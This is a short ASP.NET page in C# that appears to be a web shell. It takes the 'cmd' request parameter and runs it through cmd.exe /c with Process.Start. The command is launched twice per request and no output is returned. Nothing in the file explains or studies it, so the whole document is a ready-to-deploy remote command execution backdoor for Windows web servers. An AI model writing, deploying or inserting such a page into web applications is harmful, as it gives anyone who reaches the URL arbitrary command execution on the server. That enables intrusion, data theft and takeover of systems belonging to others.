<%@ Page Language="C#" %>
<%
    String cmd = Request["cmd"];
    System.Diagnostics.Process.Start("cmd.exe", "/c " + cmd);
    System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + cmd);
    System.Diagnostics.Process.Start(psi);
%>
